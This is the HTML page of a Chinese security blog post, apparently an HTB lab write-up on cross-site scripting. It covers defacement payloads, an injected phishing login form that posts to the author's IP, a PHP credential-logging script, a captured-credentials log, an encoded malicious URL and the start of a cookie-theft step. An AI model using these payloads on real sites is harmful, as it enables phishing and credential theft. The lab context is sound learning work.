@@ -1,0 +1,221 @@
+<!DOCTYPE html><html lang="zh_CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>跨站脚本攻击 | ziddzide的个人博客</title><meta name="author" content="ziddzide"><meta name="copyright" content="ziddzide"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="xss有效载荷列表 123https:&#x2F;&#x2F;github.com&#x2F;payload-box&#x2F;xss-payload-listhttps:&#x2F;&#x2F;github.com&#x2F;swisskyrepo&#x2F;PayloadsAllTheThings&#x2F;tree&#x2F;master xss漏洞利用 针对网站 更改背景 1&lt;script&gt;document.body.style.background &#x3D; &quot;#141">
+<meta property="og:type" content="article">
+<meta property="og:title" content="跨站脚本攻击">
+<meta property="og:url" content="https://ziddzide.github.io/2026/06/15/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/index.html">
+<meta property="og:site_name" content="ziddzide的个人博客">
+<meta property="og:description" content="xss有效载荷列表 123https:&#x2F;&#x2F;github.com&#x2F;payload-box&#x2F;xss-payload-listhttps:&#x2F;&#x2F;github.com&#x2F;swisskyrepo&#x2F;PayloadsAllTheThings&#x2F;tree&#x2F;master xss漏洞利用 针对网站 更改背景 1&lt;script&gt;document.body.style.background &#x3D; &quot;#141">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ziddzide-pirture-1406647554.cos.ap-beijing.myqcloud.com/background/cover1.png">
+<meta property="article:published_time" content="2026-06-15T08:42:45.000Z">
+<meta property="article:modified_time" content="2026-06-15T16:29:19.341Z">
+<meta property="article:author" content="ziddzide">
+<meta property="article:tag" content="Web,Security">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ziddzide-pirture-1406647554.cos.ap-beijing.myqcloud.com/background/cover1.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "跨站脚本攻击",
+  "url": "https://ziddzide.github.io/2026/06/15/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/",
+  "image": "https://ziddzide-pirture-1406647554.cos.ap-beijing.myqcloud.com/background/cover1.png",
+  "datePublished": "2026-06-15T08:42:45.000Z",
+  "dateModified": "2026-06-15T16:29:19.341Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "ziddzide",
+      "url": "https://ziddzide.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://ziddzide.github.io/2026/06/15/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          const mediaQueryDark = window.matchMedia('(prefers-color-scheme: dark)')
+          const mediaQueryLight = window.matchMedia('(prefers-color-scheme: light)')
+
+          if (theme === undefined) {
+            if (mediaQueryLight.matches) activateLightMode()
+            else if (mediaQueryDark.matches) activateDarkMode()
+            else {
+              const hour = new Date().getHours()
+              const isNight = hour <= 18 || hour >= 6
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            mediaQueryDark.addEventListener('change', () => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else {
+            theme === 'light' ? activateLightMode() : activateDarkMode()
+          }
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":true,"highlightMacStyle":true},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '跨站脚本攻击',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 8.1.2"></head><body><div class="bg-animation" id="web_bg" style="background-image: url(https://ziddzide-pirture-1406647554.cos.ap-beijing.myqcloud.com/background/win.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://ziddzide-pirture-1406647554.cos.ap-beijing.myqcloud.com/user/user.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">61</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">7</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(https://ziddzide-pirture-1406647554.cos.ap-beijing.myqcloud.com/background/cover1.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/butterfly-icon.png" alt="Logo"><span class="site-name">ziddzide的个人博客</span></a><a class="nav-page-title" href="/"><span class="site-name">跨站脚本攻击</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">跨站脚本攻击</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2026-06-15T08:42:45.000Z" title="Created 2026-06-15 16:42:45">2026-06-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-06-15T16:29:19.341Z" title="Updated 2026-06-16 00:29:19">2026-06-16</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1>xss有效载荷列表</h1>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/payload-box/xss-payload-list</span><br><span class="line"></span><br><span class="line">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master</span><br></pre></td></tr></table></figure>
+<h1>xss漏洞利用</h1>
+<h2 id="针对网站">针对网站</h2>
+<h3 id="更改背景">更改背景</h3>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">style</span>.<span class="property">background</span> = <span class="string">&quot;#141d2b&quot;</span>&lt;/script&gt; #挂黑页</span><br></pre></td></tr></table></figure>
+<h3 id="修改页面标题">修改页面标题</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;document.title = &#x27;ziddzide&#x27;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="更改页面文本">更改页面文本</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">document.getElementById(&quot;todo&quot;).innerHTML = &quot;New Text&quot;</span><br><span class="line"></span><br><span class="line">$(&quot;#todo&quot;).html(&#x27;New Text&#x27;); #利用jQuery</span><br></pre></td></tr></table></figure>
+<h2 id="网络钓鱼">网络钓鱼</h2>
+<h3 id="登录表单注入">登录表单注入</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.write(&#x27;&lt;h3&gt;Please login to continue&lt;/h3&gt;&lt;form action=http://OUR_IP&gt;&lt;input type=&quot;username&quot; name=&quot;username&quot; placeholder=&quot;Username&quot;&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;Password&quot;&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot;&gt;&lt;/form&gt;&#x27;);</span><br></pre></td></tr></table></figure>
+<h3 id="窃取cookie">窃取cookie</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当受害者尝试登录我们注入的登录表单时，我们会窃取他们的登录凭据。如果您尝试登录该表单，很可能会收到错误提示This site can’t be reached。这是因为，正如前面提到的，我们的 HTML 表单被设计成将登录请求发送到我们的 IP 地址，而该 IP 地址应该处于监听连接的状态。如果我们没有监听连接，就会收到site can’t be reached错误提示。</span><br></pre></td></tr></table></figure>
+<h1>尝试找到上述服务器上“/phishing”路径下图片URL表单的有效XSS攻击载荷，然后利用本节所学知识准备一个注入恶意登录表单的恶意URL。接着访问“/phishing/send.php”将该URL发送给受害者，受害者将登录该恶意登录表单。如果一切操作正确，你应该会收到受害者的登录凭据，你可以使用这些凭据登录“/phishing/login.php”并获取flag。</h1>
+<p>在线图像显示器的基本注入结构</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.129.234.166/phishing/?url=1</span><br></pre></td></tr></table></figure>
+<p>利用上述代码就可以构造出一个恶意表单出来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.write(&#x27;&lt;h3&gt;Please login to continue&lt;/h3&gt;&lt;form action=http://172.24.126.13&gt;&lt;input type=&quot;username&quot; name=&quot;username&quot; placeholder=&quot;Username&quot;&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;Password&quot;&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot;&gt;&lt;/form&gt;&#x27;);</span><br></pre></td></tr></table></figure>
+<p>但是页面会出现很多意料之外的错误显示，添加</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.getElementById(&#x27;urlform&#x27;).remove();</span><br></pre></td></tr></table></figure>
+<p>取消上方的url图像显示错误;</p>
+<p>继续添加<code>&lt;!--</code>注释掉因为攻击移除的字符</p>
+<p>则最后的payload为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&gt;&lt;script&gt;document.write(&#x27;&lt;h3&gt;Please login to continue&lt;/h3&gt;&lt;form action=http://172.24.126.13:80/server.php&gt;&lt;input type=&quot;username&quot; name=&quot;username&quot; placeholder=&quot;Username&quot;&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;Password&quot;&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot;&gt;&lt;/form&gt;&#x27;);document.getElementById(&#x27;urlform&#x27;).remove();&lt;/script&gt;&lt;!--</span><br></pre></td></tr></table></figure>
+<p>需要在攻击机上搭建一个php服务器，因为是连接了VPN否则不可能直接连接我内网的机器,这里重定向到登录页面盗窃凭据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&#x27;username&#x27;]) &amp;&amp; isset($_GET[&#x27;password&#x27;])) &#123;</span><br><span class="line">    $file = fopen(&quot;creds.txt&quot;, &quot;a+&quot;);</span><br><span class="line">    fputs($file, &quot;Username: &#123;$_GET[&#x27;username&#x27;]&#125; | Password: &#123;$_GET[&#x27;password&#x27;]&#125;\n&quot;);</span><br><span class="line">    header(&quot;Location: http://SERVER_IP/phishing/login.php&quot;);</span><br><span class="line">    fclose($file);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>开启服务器监听</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo php -S 0.0.0.0:80</span><br></pre></td></tr></table></figure>
+<p>收到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[Mon Jun 15 20:29:55 2026] 172.24.112.1:63075 Accepted</span><br><span class="line">[Mon Jun 15 20:29:55 2026] 172.24.112.1:63075 [302]: GET /server.php?username=kobe&amp;password=123456&amp;submit=Login</span><br><span class="line">[Mon Jun 15 20:29:55 2026] 172.24.112.1:63075 Closing</span><br></pre></td></tr></table></figure>
+<p>所以恶意url是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.129.45.113/phishing/?url=%27%3E%3Cscript%3Edocument.write(%27%3Ch3%3EPlease%20login%20to%20continue%3C/h3%3E%3Cform%20action=http://172.24.126.13:80/server.php%3E%3Cinput%20type=%22username%22%20name=%22username%22%20placeholder=%22Username%22%3E%3Cinput%20type=%22password%22%20name=%22password%22%20placeholder=%22Password%22%3E%3Cinput%20type=%22submit%22%20name=%22submit%22%20value=%22Login%22%3E%3C/form%3E%27);document.getElementById(%27urlform%27).remove();%3C/script%3E%3C!--</span><br></pre></td></tr></table></figure>
+<p>转到send.php发送，不过发送失败了，我验证了几次，这个其实和我的环境有关，在这里我使用的是kali wsl，但是vpn是在Windows上的，导致还有一层虚拟网关，正向连接可以连接到HTB，但是HTB找不到我，其实蛮有意思的，攻击企业服务器也是一样的道理，企业服务器在内网不好探查，连接不到，所以需要服务器主动出网，还有一个原因是出站宽松，入站严格。</p>
+<h1>尝试重复本节中学到的知识，找出存在漏洞的输入字段，找到有效的 XSS 有效载荷，然后使用“会话劫持”脚本获取管理员 cookie，并在“login.php”中使用它来获取 flag。</h1>
+<p>新开的路径，先看看dalfox漏扫</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dalfox url &quot;http://10.129.234.166/hijacking/?fullname=111&amp;username=222&amp;password=333&amp;email=444%40qq.com&amp;imgurl=111&quot;</span><br></pre></td></tr></table></figure>
+<p>没扫到，但是可以大胆推测在最后一个表单提交里，构造一个url看看php服务器有没有返回</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script src=http://172.24.126.13&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>其实到这里之后只需要构造一个js脚本获得cookie即可，但是之后的环节需要在我设置好kali wsl的VPN后才有可能补全</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://ziddzide.github.io">ziddzide</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://ziddzide.github.io/2026/06/15/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/">https://ziddzide.github.io/2026/06/15/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="https://ziddzide-pirture-1406647554.cos.ap-beijing.myqcloud.com/background/cover1.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/06/15/Web-Fuzzing-Skills-Assessment/" title="Web Fuzzing-Skills Assessment"><img class="cover" src="https://ziddzide-pirture-1406647554.cos.ap-beijing.myqcloud.com/background/cover3.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Web Fuzzing-Skills Assessment</div></div><div class="info-2"><div class="info-item-1">技能评估 123456789101112131415161718192021222324┌──(root㉿shadow)-[/home/luxin]└─# curl -v http://154.57.164.79:31936*   Trying 154.57.164.79:31936...* Established connection to 154.57.164.79 (154.57.164.79 port 31936) from 172.24.126.13 port 41368* using HTTP/1.x&gt; GET / HTTP/1.1&gt; Host: 154.57.164.79:31936&gt; User-Agent: curl/8.18.0&gt; Accept: */*&gt;* Request completely sent off&lt; HTTP/1.1 403 Forbidden&lt; Date: Sun, 14 Jun 2026 16:53:29 GMT&lt; Server: Apache/2.4.61 (Debian)&lt; Conte...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://ziddzide-pirture-1406647554.cos.ap-beijing.myqcloud.com/user/user.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">ziddzide</div><div class="author-info-description">记录安全研究、漏洞分析、应急响应笔记</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">61</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">7</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ziddzide"><i class="fab fa-github"></i><span>Github</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/ziddzide" target="_blank" title="Github"><i style="color: #24292e;"></i></a><a class="social-icon" href="mailto:hello@ziddzide.com" target="_blank" title="Email"><i class="1" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">欢迎来到 ziddzide 的安全博客</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">xss有效载荷列表</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">xss漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%92%88%E5%AF%B9%E7%BD%91%E7%AB%99"><span class="toc-number">2.1.</span> <span class="toc-text">针对网站</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9B%B4%E6%94%B9%E8%83%8C%E6%99%AF"><span class="toc-number">2.1.1.</span> <span class="toc-text">更改背景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E9%A1%B5%E9%9D%A2%E6%A0%87%E9%A2%98"><span class="toc-number">2.1.2.</span> <span class="toc-text">修改页面标题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9B%B4%E6%94%B9%E9%A1%B5%E9%9D%A2%E6%96%87%E6%9C%AC"><span class="toc-number">2.1.3.</span> <span class="toc-text">更改页面文本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC"><span class="toc-number">2.2.</span> <span class="toc-text">网络钓鱼</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BB%E5%BD%95%E8%A1%A8%E5%8D%95%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.1.</span> <span class="toc-text">登录表单注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AA%83%E5%8F%96cookie"><span class="toc-number">2.2.2.</span> <span class="toc-text">窃取cookie</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">尝试找到上述服务器上“&#x2F;phishing”路径下图片URL表单的有效XSS攻击载荷，然后利用本节所学知识准备一个注入恶意登录表单的恶意URL。接着访问“&#x2F;phishing&#x2F;send.php”将该URL发送给受害者，受害者将登录该恶意登录表单。如果一切操作正确，你应该会收到受害者的登录凭据，你可以使用这些凭据登录“&#x2F;phishing&#x2F;login.php”并获取flag。</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">尝试重复本节中学到的知识，找出存在漏洞的输入字段，找到有效的 XSS 有效载荷，然后使用“会话劫持”脚本获取管理员 cookie，并在“login.php”中使用它来获取 flag。</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/06/15/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/" title="跨站脚本攻击"><img src="https://ziddzide-pirture-1406647554.cos.ap-beijing.myqcloud.com/background/cover1.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="跨站脚本攻击"/></a><div class="content"><a class="title" href="/2026/06/15/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/" title="跨站脚本攻击">跨站脚本攻击</a><time datetime="2026-06-15T08:42:45.000Z" title="Created 2026-06-15 16:42:45">2026-06-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/06/15/Web-Fuzzing-Skills-Assessment/" title="Web Fuzzing-Skills Assessment"><img src="https://ziddzide-pirture-1406647554.cos.ap-beijing.myqcloud.com/background/cover3.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Web Fuzzing-Skills Assessment"/></a><div class="content"><a class="title" href="/2026/06/15/Web-Fuzzing-Skills-Assessment/" title="Web Fuzzing-Skills Assessment">Web Fuzzing-Skills Assessment</a><time datetime="2026-06-14T16:52:30.000Z" title="Created 2026-06-15 00:52:30">2026-06-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/06/15/Web-API-Fuzzing/" title="Web-API-Fuzzing"><img src="https://ziddzide-pirture-1406647554.cos.ap-beijing.myqcloud.com/background/cover1.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Web-API-Fuzzing"/></a><div class="content"><a class="title" href="/2026/06/15/Web-API-Fuzzing/" title="Web-API-Fuzzing">Web-API-Fuzzing</a><time datetime="2026-06-14T16:23:29.000Z" title="Created 2026-06-15 00:23:29">2026-06-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/06/14/Redeemer/" title="Redeemer"><img src="https://ziddzide-pirture-1406647554.cos.ap-beijing.myqcloud.com/background/cover4.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Redeemer"/></a><div class="content"><a class="title" href="/2026/06/14/Redeemer/" title="Redeemer">Redeemer</a><time datetime="2026-06-14T11:15:22.000Z" title="Created 2026-06-14 19:15:22">2026-06-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/06/13/Directory-and-File-Fuzzing/" title="Directory and File Fuzzing"><img src="https://ziddzide-pirture-1406647554.cos.ap-beijing.myqcloud.com/background/cover2.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Directory and File Fuzzing"/></a><div class="content"><a class="title" href="/2026/06/13/Directory-and-File-Fuzzing/" title="Directory and File Fuzzing">Directory and File Fuzzing</a><time datetime="2026-06-13T04:01:18.000Z" title="Created 2026-06-13 12:01:18">2026-06-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/06/13/Information-Gathering-Web-Edition/" title="Information Gathering - Web Edition"><img src="https://ziddzide-pirture-1406647554.cos.ap-beijing.myqcloud.com/background/cover3.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Information Gathering - Web Edition"/></a><div class="content"><a class="title" 